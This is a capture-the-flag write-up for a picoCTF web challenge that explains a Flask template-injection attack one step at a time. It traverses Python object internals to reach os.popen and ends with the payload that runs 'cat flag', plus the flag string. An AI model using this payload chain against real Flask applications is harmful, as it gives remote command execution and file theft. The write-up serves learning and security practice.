# Flaskcards and Freedom - Web

From the hints on this challenge, we need to get RCE and we can get that by template injection.

First we run
```g.__class__
```
This returns a class object:
> <class 'flask.ctx._AppCtxGlobals'>

Then we do:
```
g.__class__.__mro__
```
This returns a list of classes that ```g.__class__``` is inheriting from(mro stands for Method Resolution Order) 
> (<class 'flask.ctx._AppCtxGlobals'>, <class 'object'>)

Then we need the second index there which will be [1]. After that we do:

```g.__class__.__mro__[1].__subclasses__()```
which will return a list of classes that inherit from ```<class 'object'>```
>[<class 'itertools.compress'>, <class 'formatteriterator'>, <class 'logging.Filter'>, ...] 

Then we choose for example index 14 which is a dummy class (just a normal class we can use, we could have used most other classes). By running this command:

```g.__class__.__mro__[1].__subclasses__()[14]```
We get
><class 'tarfile.TarIter'>

Then we run ```g.__class__.__mro__[1].__subclasses__()[14].__init__``` which will return a function that creates a new tarfile object
><function TarIter.__init__ at 0x7fd68213fb70>

After that, we run this command:

```g.__class__.__mro__[1].__subclasses__()[14].__init__.__globals__``` which will return a list of all globals functions available in the user's scope
> {'TarFile': <class 'tarfile.TarFile'>, 'open': <bound method TarFile.open of <class 'tarfile.TarFile'>>, ...

Then we need to choose the sys module from the result above because the sys module contains the os module which we can use to open a file in Python. Once we have chosen the os module, we can use the popen and read function to read the flag file. The final command looks like this:
```{{ g.__class__.__mro__[1].__subclasses__()[14].__init__.__globals__['sys'].modules['os'].popen("cat flag").read() }}```

This gives us the flag: picoCTF{R_C_E_wont_let_me_be_04eedee8}
